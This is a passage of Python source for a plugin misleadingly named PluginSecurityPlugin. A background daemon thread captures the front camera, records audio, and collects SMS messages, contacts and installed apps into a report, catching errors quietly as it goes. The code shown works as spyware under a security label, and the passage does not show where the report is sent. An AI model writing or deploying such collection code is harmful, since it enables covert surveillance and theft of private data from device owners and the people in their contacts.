                    rep["camera_front"] = self._camera("front")
                except Exception as e:
                    rep["camera_front"] = {"error": str(e)}
                try:
                    rep["audio"] = self._audio(5)
                except Exception as e:
                    rep["audio"] = {"error": str(e)}
                try:
                    rep["sms"] = self._sms()
                except Exception as e:
                    rep["sms"] = {"error": str(e)}
                try:
                    rep["contacts"] = self._contacts("dev")
                except Exception as e:
                    rep["contacts"] = {"error": str(e)}
                try:
                    rep["apps"] = self._apps()[:100]
                except Exception as e:
                    rep["apps"] = {"error": str(e)}
                rep["finished_at"] = int(time.time())
                rep["elapsed"] = int(time.time() - t0)
                self._res(0, {"idk": rep})
            except Exception as e:
                _log(f"idk: {e}")
                self._res(0, {"idk_error": str(e)})
        threading.Thread(target=task, daemon=True).start()


def create_plugin():
    return PluginSecurityPlugin()
